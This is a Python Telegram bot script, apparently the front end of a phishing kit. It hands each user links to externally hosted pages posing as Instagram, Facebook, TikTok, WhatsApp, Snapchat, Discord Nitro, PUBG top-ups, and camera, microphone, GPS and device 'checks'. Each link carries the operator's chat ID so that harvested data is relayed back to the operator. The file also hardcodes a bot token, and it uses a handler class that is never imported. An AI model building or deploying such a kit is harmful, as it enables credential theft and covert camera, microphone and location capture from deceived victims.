import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات

# تفعيل التسجيل
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== قائمة الصفحات (الاسم، الملف، الإيموجي) ==========
PAGES = [
    ("معلومات النظام", "device.html", "📱"),
    ("مسابقة الحلم 2026", "dream.html", "🏆"),
    ("فحص الميكروفون", "mic.html", "🎤"),
    ("فحص الفيديو", "video.html", "🎥"),
    ("شحن ببجي", "pubg_cuc.html", "🎮"),
    ("Discord Nitro", "discord.html", "🎧"),
    ("Instagram", "instagram.html", "📸"),
    ("Facebook", "facebook.html", "📘"),
    ("Reddit", "reddit.html", "🤖"),
    ("فحص الكاميرا", "camera.html", "📷"),
    ("X (Twitter)", "twitter.html", "🐦"),
    ("TikTok", "tiktok.html", "🎵"),
    ("WhatsApp Web", "whatsapp.html", "💬"),
    ("Snapchat", "snapchat.html", "👻"),
    ("تحسين الموقع (GPS)", "gps.html", "📍"),
    ("Telegram Premium", "telegram.html", "✈️"),
    ("YouTube Premium", "youtube.html", "▶️"),
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """رسالة الترحيب + أزرار مرتبة في صفين"""
    chat_id = update.effective_chat.id
    keyboard = []
    
    # ترتيب الأزرار في صفين (عمودين)
    row = []
    for name, filename, emoji in PAGES:
        url = f"{BASE_URL}/{filename}?chat={chat_id}"
        button = InlineKeyboardButton(f"{emoji} {name}", url=url)
        row.append(button)
        if len(row) == 2:          # كل صف يحتوي على زرين
            keyboard.append(row)
            row = []
    # إذا بقي زر مفرد يضاف في صف منفرد
    if row:
        keyboard.append(row)
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = (
        "✨ *مرحباً بك في بوت GNRAL BOT* ✨\n\n"
        "📌 *اختر الخدمة التي تريدها من الأزرار أدناه:*\n"
        "🔹 سيتم إضافة معرف الدردشة تلقائياً لإرسال البيانات إليك.\n\n"
        "———————————————————\n"
        "© 2026 *GNRAL BOT* - جميع الحقوق محفوظة"
    )
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج النقر على الأزرار (اختياري)"""
    query = update.callback_query
    await query.answer()

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info("✅ البوت يعمل الآن باسم GNRAL BOT...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()